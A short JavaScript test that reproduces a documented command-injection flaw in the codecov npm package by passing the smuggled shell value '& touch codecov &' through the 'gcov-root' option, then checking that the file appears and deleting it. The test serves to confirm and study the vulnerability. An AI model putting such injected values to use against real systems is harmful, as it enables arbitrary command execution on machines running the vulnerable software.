//https://snyk.io/vuln/SNYK-JS-CODECOV-548879
test("Command Injection in codecov", () => {
  const root = require("codecov");
  const fs = require("fs");
  const path = "./codecov";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let args = {
    options: {
      "gcov-root": "& touch codecov &",
      "gcov-exec": " ",
      "gcov-args": " ",
    },
  };
  try {
    root.handleInput.upload(
      args,
      function () {},
      function () {}
    );
  } catch (error) {}

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
